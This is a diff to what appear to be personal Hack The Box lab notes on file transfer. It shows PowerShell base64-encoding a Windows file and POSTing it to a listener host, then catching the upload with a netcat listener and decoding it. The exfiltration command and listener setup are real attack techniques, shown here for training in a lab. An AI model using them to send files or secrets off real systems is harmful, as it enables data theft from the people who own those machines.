@@ -252,3 +252,23 @@ PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Window
 
 PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
 ```
+
+#### Catch the base64 data with NC and decode it
+```bash
+SonithGT@htb[/htb]$ nc -lvnp 8000
+
+listening on [any] 8000 ...
+connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
+POST / HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
+Content-Type: application/x-www-form-urlencoded
+Host: 192.168.49.128:8000
+Content-Length: 1820
+Connection: Keep-Alive
+
+IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
+...SNIP...
+
+# Deco
+SonithGT@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts
+```
